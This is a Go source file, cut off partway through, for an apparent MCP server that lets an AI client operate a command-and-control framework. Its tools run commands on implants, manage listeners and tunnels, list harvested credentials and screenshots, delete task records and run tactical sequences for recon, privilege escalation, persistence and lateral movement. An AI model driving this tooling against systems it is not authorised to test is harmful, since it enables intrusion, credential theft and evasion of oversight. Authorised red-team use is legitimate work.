package mcp

import (
	"encoding/json"
	"fmt"
	"time"

	"github.com/adaptix/adaptix_mcp/pkg/playbook"
	"github.com/adaptix/adaptix_mcp/pkg/utils"
)

// 参数提取辅助函数

// extractStringParam 从 params 中提取字符串参数
func extractStringParam(params map[string]interface{}, key string, required bool) (string, error) {
	value, ok := params[key]
	if !ok {
		if required {
			return "", fmt.Errorf("missing parameter: %s", key)
		}
		return "", nil
	}

	strValue, ok := value.(string)
	if !ok {
		return "", fmt.Errorf("invalid parameter type for %s: expected string", key)
	}

	if required && strValue == "" {
		return "", fmt.Errorf("parameter %s cannot be empty", key)
	}

	return strValue, nil
}

// extractNumberParam 从 params 中提取数字参数
func extractNumberParam(params map[string]interface{}, key string, required bool) (float64, error) {
	value, ok := params[key]
	if !ok {
		if required {
			return 0, fmt.Errorf("missing parameter: %s", key)
		}
		return 0, nil
	}

	numValue, ok := value.(float64)
	if !ok {
		return 0, fmt.Errorf("invalid parameter type for %s: expected number", key)
	}

	return numValue, nil
}

// extractBoolParam 从 params 中提取布尔参数
func extractBoolParam(params map[string]interface{}, key string, required bool) (bool, error) {
	value, ok := params[key]
	if !ok {
		if required {
			return false, fmt.Errorf("missing parameter: %s", key)
		}
		return false, nil
	}

	boolValue, ok := value.(bool)
	if !ok {
		return false, fmt.Errorf("invalid parameter type for %s: expected boolean", key)
	}

	return boolValue, nil
}

// extractMapParam 从 params 中提取对象参数
func extractMapParam(params map[string]interface{}, key string, required bool) (map[string]interface{}, error) {
	value, ok := params[key]
	if !ok {
		if required {
			return nil, fmt.Errorf("missing parameter: %s", key)
		}
		return nil, nil
	}

	mapValue, ok := value.(map[string]interface{})
	if !ok {
		return nil, fmt.Errorf("invalid parameter type for %s: expected object", key)
	}

	return mapValue, nil
}

// extractArrayParam 从 params 中提取数组参数
func extractArrayParam(params map[string]interface{}, key string, required bool) ([]interface{}, error) {
	value, ok := params[key]
	if !ok {
		if required {
			return nil, fmt.Errorf("missing parameter: %s", key)
		}
		return nil, nil
	}

	arrayValue, ok := value.([]interface{})
	if !ok {
		return nil, fmt.Errorf("invalid parameter type for %s: expected array", key)
	}

	return arrayValue, nil
}

// registerTools 注册所有Tools
func (s *MCPServer) registerTools() {
	s.tools["execute_command"] = s.handleExecuteCommandTool
	s.tools["get_console_output"] = s.handleGetConsoleOutputTool
	s.tools["clear_console"] = s.handleClearConsoleTool
	s.tools["list_agents"] = s.handleListAgentsTool
	s.tools["get_agent_info"] = s.handleGetAgentInfoTool
	s.tools["list_listeners"] = s.handleListListenersTool
	s.tools["manage_listener"] = s.handleManageListenerTool
	s.tools["list_collected_data"] = s.handleListCollectedDataTool
	s.tools["list_tasks"] = s.handleListTasksTool
	s.tools["get_task_output"] = s.handleGetTaskOutputTool
	s.tools["delete_tasks"] = s.handleDeleteTasksTool
	s.tools["list_tunnels"] = s.handleListTunnelsTool
	s.tools["manage_tunnel"] = s.handleManageTunnelTool
	s.tools["update_agent_config"] = s.handleUpdateAgentConfigTool
	s.tools["update_agent_metadata"] = s.handleUpdateAgentMetadataTool
	s.tools["list_targets"] = s.handleListTargetsTool
	s.tools["list_pivots"] = s.handleListPivotsTool
	s.tools["list_playbooks"] = s.handleListPlaybooksTool
	s.tools["get_playbook"] = s.handleGetPlaybookTool
	s.tools["run_playbook"] = s.handleRunPlaybookTool
	s.tools["get_playbook_run"] = s.handleGetPlaybookRunTool
	s.tools["list_triggers"] = s.handleListTriggersTool
	s.tools["manage_trigger"] = s.handleManageTriggerTool
	s.tools["simulate_event"] = s.handleSimulateEventTool

	// 战术指导工具
	s.tools["list_tactical_phases"] = s.handleListTacticalPhasesTool
	s.tools["get_tactical_commands"] = s.handleGetTacticalCommandsTool
	s.tools["run_tactical_sequence"] = s.handleRunTacticalSequenceTool

	utils.DebugLogger.Println("🛠️  Registered 28 tools")
}

func (s *MCPServer) handleListPlaybooksTool(params map[string]interface{}) (interface{}, error) {
	list, err := playbook.ListPlaybooks()
	if err != nil {
		return nil, err
	}
	return map[string]interface{}{
		"playbooks": list,
		"total":     len(list),
	}, nil
}

func (s *MCPServer) handleGetPlaybookTool(params map[string]interface{}) (interface{}, error) {
	playbookID, err := extractStringParam(params, "playbook_id", true)
	if err != nil {
		return nil, err
	}

	doc, path, err := playbook.LoadPlaybookByID(playbookID)
	if err != nil {
		return nil, err
	}

	return map[string]interface{}{
		"path":     path,
		"playbook": doc,
	}, nil
}

func (s *MCPServer) handleRunPlaybookTool(params map[string]interface{}) (interface{}, error) {
	playbookID, err := extractStringParam(params, "playbook_id", true)
	if err != nil {
		return nil, err
	}

	inputs, err := extractMapParam(params, "inputs", false)
	if err != nil {
		return nil, err
	}
	if inputs == nil {
		inputs = map[string]interface{}{}
	}

	// 检查是否只做计划（不执行）
	planOnly, _ := extractBoolParam(params, "plan_only", false)

	doc, path, err := playbook.LoadPlaybookByID(playbookID)
	if err != nil {
		return nil, err
	}

	// 如果只是计划模式，创建并返回运行记录
	if planOnly {
		plan := map[string]interface{}{
			"playbook_id":   playbookID,
			"playbook_path": path,
			"metadata":      doc.Metadata,
			"spec":          doc.Spec,
		}
		rec, runPath, err := playbook.CreateRun(playbookID, inputs, plan)
		if err != nil {
			return nil, err
		}
		return map[string]interface{}{
			"run":      rec,
			"run_path": runPath,
			"mode":     "plan_only",
		}, nil
	}

	// 加载 Action Catalog
	catalog, err := playbook.LoadActionCatalog()
	if err != nil {
		return nil, fmt.Errorf("failed to load action catalog: %w", err)
	}

	// 创建执行引擎
	engine := playbook.NewEngine(catalog, s.invokeToolForPlaybook)

	// 执行 playbook
	runState, err := engine.Execute(doc, inputs)
	if err != nil {
		// 即使执行失败，也保存运行记录
		if runState != nil {
			playbook.SaveRun(runState)
		}
		return nil, fmt.Errorf("playbook execution failed: %w", err)
	}

	// 保存运行记录
	rec, runPath, err := playbook.SaveRun(runState)
	if err != nil {
		return nil, fmt.Errorf("failed to save run: %w", err)
	}

	// 构建步骤摘要
	stepsSummary := make(map[string]interface{})
	for id, step := range runState.Steps {
		stepsSummary[id] = map[string]interface{}{
			"status":    step.Status,
			"extracted": step.Extracted,
		}
		if step.Error != "" {
			stepsSummary[id].(map[string]interface{})["error"] = step.Error
		}
	}

	return map[string]interface{}{
		"run":      rec,
		"run_path": runPath,
		"status":   runState.Status,
		"steps":    stepsSummary,
	}, nil
}

// invokeToolForPlaybook 为 playbook 执行引擎提供工具调用能力
func (s *MCPServer) invokeToolForPlaybook(toolName string, args map[string]interface{}) (interface{}, error) {
	handler, ok := s.tools[toolName]
	if !ok {
		return nil, fmt.Errorf("unknown tool: %s", toolName)
	}
	return handler(args)
}

func (s *MCPServer) handleGetPlaybookRunTool(params map[string]interface{}) (interface{}, error) {
	runPath, err := extractStringParam(params, "run_path", true)
	if err != nil {
		return nil, err
	}

	rec, err := playbook.ReadRun(runPath)
	if err != nil {
		return nil, err
	}
	return rec, nil
}

// routeTool 路由Tool请求
func (s *MCPServer) routeTool(name string, params map[string]interface{}) (CallToolResult, error) {
	handler, ok := s.tools[name]
	if !ok {
		return CallToolResult{}, fmt.Errorf("unknown tool: %s", name)
	}

	// 调用Handler
	data, err := handler(params)
	if err != nil {
		return CallToolResult{
			Content: []interface{}{
				TextContent{
					Type: "text",
					Text: fmt.Sprintf("Error: %v", err),
				},
			},
			IsError: true,
		}, nil
	}

	// 将结果转换为文本
	text := fmt.Sprintf("%v", data)

	return CallToolResult{
		Content: []interface{}{
			TextContent{
				Type: "text",
				Text: text,
			},
		},
		IsError: false,
	}, nil
}

// handleExecuteCommandTool 执行命令
func (s *MCPServer) handleExecuteCommandTool(params map[string]interface{}) (interface{}, error) {
	agentID, err := extractStringParam(params, "agent_id", true)
	if err != nil {
		return nil, err
	}

	command, err := extractStringParam(params, "command", true)
	if err != nil {
		return nil, err
	}

	// 提取可选参数
	waitForResult, _ := extractBoolParam(params, "wait_for_result", false)
	maxWaitSeconds, _ := extractNumberParam(params, "max_wait_seconds", false)
	if maxWaitSeconds == 0 {
		maxWaitSeconds = 30 // 默认等待30秒
	}

	// 记录执行前的时间戳
	executeTime := time.Now().Unix()

	// 调用ConsoleHandler执行命令
	_, err = s.clientConnector.SendCommand("console", map[string]interface{}{
		"command":  "send_input",
		"agent_id": agentID,
		"input":    command,
	})
	if err != nil {
		return nil, fmt.Errorf("failed to execute command: %w", err)
	}

	// 等待一小段时间让任务创建
	time.Sleep(500 * time.Millisecond)

	// 查询该 agent 的任务列表，找到对应的任务
	taskID, taskInfo, err := s.findMatchingTask(agentID, command, executeTime)
	if err != nil {
		// 如果找不到任务，仍然返回成功（命令已发送）
		return map[string]interface{}{
			"message":  fmt.Sprintf("✅ Command sent to agent %s: %s", agentID, command),
			"agent_id": agentID,
			"command":  command,
			"task_id":  "",
			"note":     "Task not found yet, use get_task_output with task_id from list_tasks",
		}, nil
	}

	result := map[string]interface{}{
		"message":   fmt.Sprintf("✅ Command sent to agent %s: %s", agentID, command),
		"agent_id":  agentID,
		"command":   command,
		"task_id":   taskID,
		"status":    taskInfo["status"],
		"completed": taskInfo["completed"],
	}

	// 如果不需要等待结果，检查任务是否已经完成（包括错误状态）
	if !waitForResult {
		// 快速检查一次任务状态，如果已完成（包括错误），返回结果
		taskOutput, err := s.clientConnector.SendCommand("info", map[string]interface{}{
			"command": "get_task_output",
			"task_id": taskID,
		})
		if err == nil && taskOutput.Data != nil {
			if completed, _ := taskOutput.Data["completed"].(bool); completed {
				status, _ := taskOutput.Data["status"].(string)
				output, _ := taskOutput.Data["output"].(string)
				result["completed"] = completed
				result["status"] = status
				result["output"] = output
				result["output_size"] = len(output)
				if status == "Error" && output != "" {
					result["error"] = true
					result["error_message"] = output
				}
			}
		}
		return result, nil
	}

	// 等待任务完成
	taskResult, err := s.waitForTaskCompletion(taskID, int(maxWaitSeconds))
	if err != nil {
		result["wait_error"] = err.Error()
		return result, nil
	}

	// 合并任务结果
	result["completed"] = taskResult["completed"]
	result["status"] = taskResult["status"]
	result["output"] = taskResult["output"]
	result["output_size"] = taskResult["output_size"]
	result["finish_time"] = taskResult["finish_time"]

	// 如果是错误状态，明确标记为错误
	if taskResult["status"] == "Error" {
		result["error"] = true
		if output, ok := taskResult["output"].(string); ok && output != "" {
			result["error_message"] = output
		}
	}

	return result, nil
}

// findMatchingTask 查找匹配的任务
func (s *MCPServer) findMatchingTask(agentID, command string, executeTime int64) (string, map[string]interface{}, error) {
	// 查询该 agent 的任务列表
	resp, err := s.clientConnector.SendCommand("info", map[string]interface{}{
		"command":  "list_tasks",
		"agent_id": agentID,
	})
	if err != nil {
		return "", nil, fmt.Errorf("failed to list tasks: %w", err)
	}

	// 解析任务列表
	if resp.Data == nil {
		return "", nil, fmt.Errorf("no task data returned")
	}

	tasks, ok := resp.Data["tasks"].([]interface{})
	if !ok {
		return "", nil, fmt.Errorf("invalid tasks array format")
	}

	// 查找匹配的任务（命令相同，且开始时间在执行时间之后）
	for _, taskInterface := range tasks {
		task, ok := taskInterface.(map[string]interface{})
		if !ok {
			continue
		}

		taskCommand, _ := task["command"].(string)
		taskAgentID, _ := task["agent_id"].(string)
		taskStartTime, _ := task["start_time"].(float64)

		// 匹配条件：命令相同、agent 相同、开始时间在执行时间之后（允许5秒误差）
		if taskCommand == command && taskAgentID == agentID {
			// 检查时间（任务开始时间应该在执行时间之后，但不能太早）
			if int64(taskStartTime) >= executeTime-5 && int64(taskStartTime) <= executeTime+10 {
				taskID, _ := task["task_id"].(string)
				return taskID, task, nil
			}
		}
	}

	return "", nil, fmt.Errorf("matching task not found")
}

// waitForTaskCompletion 等待任务完成
func (s *MCPServer) waitForTaskCompletion(taskID string, maxWaitSeconds int) (map[string]interface{}, error) {
	deadline := time.Now().Add(time.Duration(maxWaitSeconds) * time.Second)
	pollInterval := 500 * time.Millisecond

	for time.Now().Before(deadline) {
		// 查询任务输出
		resp, err := s.clientConnector.SendCommand("info", map[string]interface{}{
			"command": "get_task_output",
			"task_id": taskID,
		})
		if err != nil {
			return nil, fmt.Errorf("failed to get task output: %w", err)
		}

		if resp.Data != nil {
			completed, _ := resp.Data["completed"].(bool)
			if completed {
				// 任务完成，返回结果（包括成功和错误状态）
				output, _ := resp.Data["output"].(string)
				outputSize := len(output)
				status, _ := resp.Data["status"].(string)

				result := map[string]interface{}{
					"completed":   completed,
					"status":      status,
					"output":      output,
					"output_size": outputSize,
					"finish_time": resp.Data["finish_time"],
				}

				// 如果是错误状态，明确标记
				if status == "Error" {
					result["error"] = true
					if output != "" {
						result["error_message"] = output
					}
				}

				return result, nil
			}
		}

		// 等待一段时间再查询
		time.Sleep(pollInterval)
	}

	return nil, fmt.Errorf("task did not complete within %d seconds", maxWaitSeconds)
}

// handleGetConsoleOutputTool 获取控制台输出
func (s *MCPServer) handleGetConsoleOutputTool(params map[string]interface{}) (interface{}, error) {
	agentID, err := extractStringParam(params, "agent_id", true)
	if err != nil {
		return nil, err
	}

	// 调用InfoHandler获取控制台输出
	resp, err := s.clientConnector.SendCommand("info", map[string]interface{}{
		"command":  "get_agent_console",
		"agent_id": agentID,
	})
	if err != nil {
		return nil, fmt.Errorf("failed to get console output: %w", err)
	}

	// 从响应中提取console_output
	if resp.Data != nil {
		if consoleOutput, ok := resp.Data["console_output"].(string); ok {
			return consoleOutput, nil
		}
	}

	return "", fmt.Errorf("no console output available")
}

// handleClearConsoleTool 清空控制台输出
func (s *MCPServer) handleClearConsoleTool(params map[string]interface{}) (interface{}, error) {
	agentID, err := extractStringParam(params, "agent_id", true)
	if err != nil {
		return nil, err
	}

	// 调用ConsoleHandler清空控制台
	resp, err := s.clientConnector.SendCommand("console", map[string]interface{}{
		"command":  "clear_console",
		"agent_id": agentID,
	})
	if err != nil {
		return nil, fmt.Errorf("failed to clear console: %w", err)
	}

	// 返回成功消息
	if resp.Status == "success" {
		return fmt.Sprintf("✅ Console cleared for agent %s", agentID), nil
	}

	return nil, fmt.Errorf("failed to clear console: %s", resp.Message)
}

// handleListAgentsTool 列出所有Agent
func (s *MCPServer) handleListAgentsTool(params map[string]interface{}) (interface{}, error) {
	// 调用InfoHandler获取Agent列表
	resp, err := s.clientConnector.SendCommand("info", map[string]interface{}{
		"command": "list_agents",
	})
	if err != nil {
		return nil, fmt.Errorf("failed to list agents: %w", err)
	}

	// 从响应中提取agents数据
	if resp.Data != nil {
		if agents, ok := resp.Data["agents"]; ok {
			return agents, nil
		}
	}

	return []interface{}{}, nil
}

// handleGetAgentInfoTool 获取Agent详细信息
func (s *MCPServer) handleGetAgentInfoTool(params map[string]interface{}) (interface{}, error) {
	agentID, err := extractStringParam(params, "agent_id", true)
	if err != nil {
		return nil, err
	}

	// 调用InfoHandler获取Agent信息
	resp, err := s.clientConnector.SendCommand("info", map[string]interface{}{
		"command":  "get_agent_info",
		"agent_id": agentID,
	})
	if err != nil {
		return nil, fmt.Errorf("failed to get agent info: %w", err)
	}

	// 返回整个data对象
	if resp.Data != nil {
		return resp.Data, nil
	}

	return map[string]interface{}{}, fmt.Errorf("no agent info available")
}

// handleListTasksTool 列出所有任务
func (s *MCPServer) handleListTasksTool(params map[string]interface{}) (interface{}, error) {
	// Optional agent_id filter
	reqParams := map[string]interface{}{
		"command": "list_tasks",
	}

	agentID, _ := extractStringParam(params, "agent_id", false)
	if agentID != "" {
		reqParams["agent_id"] = agentID
	}

	resp, err := s.clientConnector.SendCommand("info", reqParams)
	if err != nil {
		return nil, fmt.Errorf("failed to list tasks: %w", err)
	}

	if resp.Data != nil {
		return resp.Data, nil
	}

	return map[string]interface{}{
		"tasks": []interface{}{},
		"count": 0,
	}, nil
}

// handleGetTaskOutputTool 获取指定任务的完整输出
func (s *MCPServer) handleGetTaskOutputTool(params map[string]interface{}) (interface{}, error) {
	taskID, err := extractStringParam(params, "task_id", true)
	if err != nil {
		return nil, err
	}

	resp, err := s.clientConnector.SendCommand("info", map[string]interface{}{
		"command": "get_task_output",
		"task_id": taskID,
	})
	if err != nil {
		return nil, fmt.Errorf("failed to get task output: %w", err)
	}

	if resp.Data != nil {
		return resp.Data, nil
	}

	return nil, fmt.Errorf("task not found: %s", taskID)
}

// handleDeleteTasksTool 删除任务
func (s *MCPServer) handleDeleteTasksTool(params map[string]interface{}) (interface{}, error) {
	agentID, err := extractStringParam(params, "agent_id", true)
	if err != nil {
		return nil, err
	}

	// 支持单个 task_id 或多个 task_ids
	var taskIDs []string

	if taskID, _ := extractStringParam(params, "task_id", false); taskID != "" {
		taskIDs = []string{taskID}
	} else if taskIDsArray, err := extractArrayParam(params, "task_ids", false); err == nil && len(taskIDsArray) > 0 {
		for _, v := range taskIDsArray {
			if id, ok := v.(string); ok {
				taskIDs = append(taskIDs, id)
			}
		}
	} else {
		return nil, fmt.Errorf("missing required parameter: task_id or task_ids")
	}

	if len(taskIDs) == 0 {
		return nil, fmt.Errorf("no task IDs provided")
	}

	// 调用AgentHandler删除任务
	resp, err := s.clientConnector.SendCommand("agent", map[string]interface{}{
		"command":  "delete_tasks",
		"agent_id": agentID,
		"task_ids": taskIDs,
	})
	if err != nil {
		return nil, fmt.Errorf("failed to delete tasks: %w", err)
	}

	return map[string]interface{}{
		"message":  resp.Message,
		"agent_id": agentID,
		"task_ids": taskIDs,
		"count":    len(taskIDs),
		"success":  resp.Status == "success",
	}, nil
}

// handleListListenersTool 列出所有Listener
func (s *MCPServer) handleListListenersTool(params map[string]interface{}) (interface{}, error) {
	// 调用ListenerHandler获取Listener列表
	resp, err := s.clientConnector.SendCommand("listener", map[string]interface{}{
		"command": "list",
	})
	if err != nil {
		return nil, fmt.Errorf("failed to list listeners: %w", err)
	}

	// 从响应中提取listeners数据
	if resp.Data != nil {
		if listeners, ok := resp.Data["listeners"]; ok {
			return listeners, nil
		}
	}

	return []interface{}{}, nil
}

// handleListCollectedDataTool 列出收集的数据（凭证/下载/截图）
func (s *MCPServer) handleListCollectedDataTool(params map[string]interface{}) (interface{}, error) {
	// 提取 data_type
	dataType, err := extractStringParam(params, "data_type", true)
	if err != nil {
		return nil, err
	}

	// 验证 data_type
	validTypes := map[string]string{
		"credentials": "list_credentials",
		"downloads":   "list_downloads",
		"screenshots": "list_screenshots",
	}

	command, ok := validTypes[dataType]
	if !ok {
		return nil, fmt.Errorf("invalid data_type: must be one of 'credentials', 'downloads', 'screenshots'")
	}

	// 调用InfoHandler
	resp, err := s.clientConnector.SendCommand("info", map[string]interface{}{
		"command": command,
	})
	if err != nil {
		return nil, fmt.Errorf("failed to list %s: %w", dataType, err)
	}

	// 从响应中提取数据
	if resp.Data != nil {
		if data, ok := resp.Data[dataType]; ok {
			return data, nil
		}
	}

	return []interface{}{}, nil
}

// handleManageListenerTool 管理Listener（创建/编辑/停止）
func (s *MCPServer) handleManageListenerTool(params map[string]interface{}) (interface{}, error) {
	// 提取 action
	action, err := extractStringParam(params, "action", true)
	if err != nil {
		return nil, err
	}

	// 验证 action
	if action != "create" && action != "edit" && action != "stop" {
		return nil, fmt.Errorf("invalid action: must be 'create', 'edit', or 'stop'")
	}

	// 提取 name（所有操作都需要）
	name, err := extractStringParam(params, "name", true)
	if err != nil {
		return nil, err
	}

	// 构建请求参数
	reqParams := map[string]interface{}{
		"command": action,
		"name":    name,
	}

	// create 需要 type
	if action == "create" {
		listenerType, err := extractStringParam(params, "type", true)
		if err != nil {
			return nil, err
		}
		reqParams["listener_type"] = listenerType
	}

	// create 和 edit 需要 config
	if action == "create" || action == "edit" {
		config, err := extractMapParam(params, "config", true)
		if err != nil {
			return nil, err
		}
		// Convert config map to JSON string (ListenerHandler expects a JSON string)
		configJSON, err := json.Marshal(config)
		if err != nil {
			return nil, fmt.Errorf("failed to marshal config: %w", err)
		}
		reqParams["config"] = string(configJSON)
	}

	// 调用ListenerHandler
	resp, err := s.clientConnector.SendCommand("listener", reqParams)
	if err != nil {
		return nil, fmt.Errorf("failed to %s listener: %w", action, err)
	}

	return fmt.Sprintf("✅ Listener %sd: %s\nMessage: %s", action, name, resp.Message), nil
}

// handleListTunnelsTool 列出所有Tunnel
func (s *MCPServer) handleListTunnelsTool(params map[string]interface{}) (interface{}, error) {
	// 调用TunnelHandler
	resp, err := s.clientConnector.SendCommand("tunnel", map[string]interface{}{
		"command": "list",
	})
	if err != nil {
		return nil, fmt.Errorf("failed to list tunnels: %w", err)
	}

	if resp.Data != nil {
		return resp.Data, nil
	}

	return map[string]interface{}{
		"tunnels": []interface{}{},
		"total":   0,
	}, nil
}

// handleManageTunnelTool 管理Tunnel（创建/停止）
func (s *MCPServer) handleManageTunnelTool(params map[string]interface{}) (interface{}, error) {
	// 提取 action
	action, err := extractStringParam(params, "action", true)
	if err != nil {
		return nil, err
	}

	// 验证 action
	if action != "create" && action != "stop" {
		return nil, fmt.Errorf("invalid action: must be 'create' or 'stop'")
	}

	// 构建请求参数
	reqParams := map[string]interface{}{
		"command": action,
	}

	if action == "create" {
		// 创建需要 tunnel_type 和 config
		tunnelType, err := extractStringParam(params, "tunnel_type", true)
		if err != nil {
			return nil, err
		}
		config, err := extractStringParam(params, "config", true)
		if err != nil {
			return nil, err
		}
		reqParams["tunnel_type"] = tunnelType
		reqParams["config"] = config
	} else {
		// 停止需要 tunnel_id
		tunnelID, err := extractStringParam(params, "tunnel_id", true)
		if err != nil {
			return nil, err
		}
		reqParams["tunnel_id"] = tunnelID
	}

	// 调用TunnelHandler
	resp, err := s.clientConnector.SendCommand("tunnel", reqParams)
	if err != nil {
		return nil, fmt.Errorf("failed to %s tunnel: %w", action, err)
	}

	return fmt.Sprintf("✅ Tunnel %sd\nMessage: %s", action, resp.Message), nil
}

// handleUpdateAgentConfigTool 更新Agent配置
func (s *MCPServer) handleUpdateAgentConfigTool(params map[string]interface{}) (interface{}, error) {
	agentID, err := extractStringParam(params, "agent_id", true)
	if err != nil {
		return nil, err
	}

	reqParams := map[string]interface{}{
		"command":  "update_config",
		"agent_id": agentID,
	}

	// Optional parameters
	if sleep, err := extractNumberParam(params, "sleep", false); err == nil && sleep > 0 {
		reqParams["sleep"] = sleep
	}

	if jitter, err := extractNumberParam(params, "jitter", false); err == nil && jitter >= 0 {
		reqParams["jitter"] = jitter
	}

	resp, err := s.clientConnector.SendCommand("agent", reqParams)
	if err != nil {
		return nil, fmt.Errorf("failed to update agent config: %w", err)
	}

	return fmt.Sprintf("✅ Agent config updated: %s\nMessage: %s", agentID, resp.Message), nil
}

// handleUpdateAgentMetadataTool 更新Agent元数据（tag/mark）
func (s *MCPServer) handleUpdateAgentMetadataTool(params map[string]interface{}) (interface{}, error) {
	// 提取 metadata_type (tag 或 mark)
	metadataType, err := extractStringParam(params, "metadata_type", true)
	if err != nil {
		return nil, err
	}

	// 验证 metadata_type
	if metadataType != "tag" && metadataType != "mark" {
		return nil, fmt.Errorf("invalid metadata_type: must be 'tag' or 'mark'")
	}

	// 提取 value
	value, _ := extractStringParam(params, "value", false) // Value can be empty

	// 提取 agent_id 或 agent_ids
	agentID, _ := extractStringParam(params, "agent_id", false)
	agentIDs, _ := extractArrayParam(params, "agent_ids", false)

	if agentID == "" && len(agentIDs) == 0 {
		return nil, fmt.Errorf("missing agent_id or agent_ids")
	}

	// 构建请求参数
	reqParams := map[string]interface{}{
		"command": "set_" + metadataType,
	}

	if agentID != "" {
		reqParams["agent_id"] = agentID
	} else {
		reqParams["agent_ids"] = agentIDs
	}

	reqParams[metadataType] = value

	// 发送请求
	resp, err := s.clientConnector.SendCommand("agent", reqParams)
	if err != nil {
		return nil, fmt.Errorf("failed to update agent %s: %w", metadataType, err)
	}

	return fmt.Sprintf("✅ Agent %s updated\nMessage: %s", metadataType, resp.Message), nil
}

// handleListTargetsTool 列出所有Target
func (s *MCPServer) handleListTargetsTool(params map[string]interface{}) (interface{}, error) {
	resp, err := s.clientConnector.SendCommand("targets", map[string]interface{}{
		"command": "list",
	})
	if err != nil {
		return nil, fmt.Errorf("failed to list targets: %w", err)
	}

	if resp.Data != nil {
		return resp.Data, nil
	}

	return map[string]interface{}{
		"targets": []interface{}{},
		"total":   0,
	}, nil
}

// handleListPivotsTool 列出所有Pivot
func (s *MCPServer) handleListPivotsTool(params map[string]interface{}) (interface{}, error) {
	resp, err := s.clientConnector.SendCommand("pivots", map[string]interface{}{
		"command": "list",
	})
	if err != nil {
		return nil, fmt.Errorf("failed to list pivots: %w", err)
	}

	if resp.Data != nil {
		return resp.Data, nil
	}

	return map[string]interface{}{
		"pivots": []interface{}{},
		"total":  0,
	}, nil
}

// handleListTriggersTool 列出所有触发规则
func (s *MCPServer) handleListTriggersTool(params map[string]interface{}) (interface{}, error) {
	rules := playbook.GetTriggerManager().ListRules()
	return map[string]interface{}{
		"triggers": rules,
		"total":    len(rules),
	}, nil
}

// handleManageTriggerTool 管理触发规则
func (s *MCPServer) handleManageTriggerTool(params map[string]interface{}) (interface{}, error) {
	action, err := extractStringParam(params, "action", true)
	if err != nil {
		return nil, err
	}

	ruleID, err := extractStringParam(params, "rule_id", true)
	if err != nil {
		return nil, err
	}

	tm := playbook.GetTriggerManager()

	switch action {
	case "enable":
		if err := tm.SetRuleEnabled(ruleID, true); err != nil {
			return nil, err
		}
		return map[string]interface{}{
			"message": fmt.Sprintf("✅ Trigger %s enabled", ruleID),
		}, nil

	case "disable":
		if err := tm.SetRuleEnabled(ruleID, false); err != nil {
			return nil, err
		}
		return map[string]interface{}{
			"message": fmt.Sprintf("✅ Trigger %s disabled", ruleID),
		}, nil

	default:
		return nil, fmt.Errorf("invalid action: must be 'enable' or 'disable'")
	}
}

// handleSimulateEventTool 模拟事件（用于测试触发器）
func (s *MCPServer) handleSimulateEventTool(params map[string]interface{}) (interface{}, error) {
	eventType, err := extractStringParam(params, "event_type", true)
	if err != nil {
		return nil, err
	}

	eventData, err := extractMapParam(params, "data", false)
	if err != nil {
		return nil, err
	}
	if eventData == nil {
		eventData = map[string]interface{}{}
	}

	event := playbook.CreateEventFromAgentData(playbook.EventType(eventType), eventData)
	playbook.GetTriggerManager().HandleEvent(event)

	return map[string]interface{}{
		"message":    fmt.Sprintf("✅ Simulated event: %s", eventType),
		"event_data": eventData,
	}, nil
}

// ==================== 战术指导工具 ====================

// handleListTacticalPhasesTool 列出战术阶段
func (s *MCPServer) handleListTacticalPhasesTool(params map[string]interface{}) (interface{}, error) {
	osType, _ := extractStringParam(params, "os", false)
	if osType == "" {
		osType = "windows"
	}

	phases := getTacticalPhases(osType)
	return map[string]interface{}{
		"os":     osType,
		"phases": phases,
		"total":  len(phases),
	}, nil
}

// handleGetTacticalCommandsTool 获取指定阶段的命令
func (s *MCPServer) handleGetTacticalCommandsTool(params map[string]interface{}) (interface{}, error) {
	phaseID, err := extractStringParam(params, "phase_id", true)
	if err != nil {
		return nil, err
	}

	osType, _ := extractStringParam(params, "os", false)
	if osType == "" {
		osType = "windows"
	}

	commands := getTacticalCommands(osType, phaseID)
	return map[string]interface{}{
		"phase_id": phaseID,
		"os":       osType,
		"commands": commands,
		"total":    len(commands),
	}, nil
}

// handleRunTacticalSequenceTool 顺序执行战术命令
func (s *MCPServer) handleRunTacticalSequenceTool(params map[string]interface{}) (interface{}, error) {
	agentID, err := extractStringParam(params, "agent_id", true)
	if err != nil {
		return nil, err
	}

	commandsParam, err := extractArrayParam(params, "commands", true)
	if err != nil {
		return nil, err
	}

	delaySeconds, _ := extractNumberParam(params, "delay_seconds", false)
	if delaySeconds == 0 {
		delaySeconds = 2
	}

	results := []map[string]interface{}{}
	for i, cmdInterface := range commandsParam {
		cmd, ok := cmdInterface.(string)
		if !ok {
			continue
		}

		// 执行命令
		result, err := s.handleExecuteCommandTool(map[string]interface{}{
			"agent_id":        agentID,
			"command":         cmd,
			"wait_for_result": false,
		})

		stepResult := map[string]interface{}{
			"step":    i + 1,
			"command": cmd,
		}

		if err != nil {
			stepResult["status"] = "error"
			stepResult["error"] = err.Error()
		} else {
			stepResult["status"] = "sent"
			stepResult["result"] = result
		}

		results = append(results, stepResult)

		// 间隔延迟
		if i < len(commandsParam)-1 && delaySeconds > 0 {
			time.Sleep(time.Duration(delaySeconds) * time.Second)
		}
	}

	return map[string]interface{}{
		"agent_id":      agentID,
		"total":         len(results),
		"delay_seconds": delaySeconds,
		"results":       results,
	}, nil
}

// getTacticalPhases 获取战术阶段定义
func getTacticalPhases(osType string) []map[string]interface{} {
	if osType == "linux" {
		return []map[string]interface{}{
			{"id": "recon", "name": "🔍 侦察", "description": "收集目标系统信息"},
			{"id": "privesc", "name": "⬆️ 提权", "description": "提升权限"},
			{"id": "persist", "name": "🔒 持久化", "description": "建立持久访问"},
			{"id": "lateral", "name": "↔️ 横向", "description": "内网横向移动"},
		}
	}
	return []map[string]interface{}{
		{"id": "recon", "name": "🔍 侦察", "description": "收集目标系统信息"},
		{"id": "privesc", "name": "⬆️ 提权", "description": "提升权限"},
		{"id": "persist", "name": "🔒 持久化", "description": "建立持久访问"},
		{"id": "lateral", "name": "↔️ 横向", "description": "内网横向移动"},
		{"id": "transfer", "name": "📥 传输", "description": "文件传输和下载"},
	}
}

// getTacticalCommands 获取指定阶段的命令
func getTacticalCommands(osType, phaseID string) []map[string]interface{} {
	commands := map[string]map[string][]map[string]interface{}{
		"windows": {
			"recon": {
				{"id": "whoami", "name": "当前用户", "cmd": "whoami /all", "description": "查看当前用户身份和权限组"},
				{"id": "hostname", "name": "主机名", "cmd": "hostname", "description": "获取计算机名称"},
				{"id": "ipconfig", "name": "网络配置", "cmd": "ipconfig /all", "description": "查看网络接口配置"},
				{"id": "systeminfo", "name": "系统信息", "cmd": "systeminfo", "description": "获取操作系统详细信息"},
				{"id": "arp", "name": "ARP 缓存", "cmd": "arp -a", "description": "查看 ARP 表获取相邻主机"},
				{"id": "route", "name": "路由表", "cmd": "route print", "description": "查看路由表了解网络拓扑"},
